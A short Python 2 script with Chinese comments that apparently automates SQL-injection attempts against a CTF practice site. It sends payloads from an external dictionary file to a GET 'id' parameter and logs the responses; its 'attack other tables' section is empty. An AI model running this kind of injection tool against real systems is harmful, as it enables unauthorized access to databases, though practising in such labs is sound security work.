# -*- coding: utf-8 -*-
import urllib2
import urllib
#脚本应用于get请求单框注入情况下
#定义一个url
#脚本作用为遍历扫描得到的可用关键字，匹配攻击字典
url='http://ctf5.shiyanbar.com/423/web/?id=';
#定义关键字测试使用的载荷库
#攻击分为：
# 1、攻击本表:
#可以尝试使用SQL_myTable_injectdic文件中提供的攻击载荷
# 2、攻击其他表:
#可以尝试使用自己学习新建的SQL_otherTable_injectdic文件中提供的攻击载荷
# 3、攻击其他数据库
# 使用SQL Union Select语句获取

#本表攻击：
f = file("final.txt", "w+")
keyword=[]
for i in open("test_result_final.txt"):
    keyword.append(i.replace("\n",""))
for line in open("dict/SQLinjectdic.txt"):
    # line即为最终攻击载荷
    line=line.replace("\n","")
    for k in keyword:
        print k+'  vs   '+line.lower()
        if(line.lower().find(k.lower())>-1):
            print url+line + "\n"
            req = urllib2.Request(url + line)
            res = urllib2.urlopen(req).read()
            f.writelines(res + "\n")
f.close()

#外表攻击：
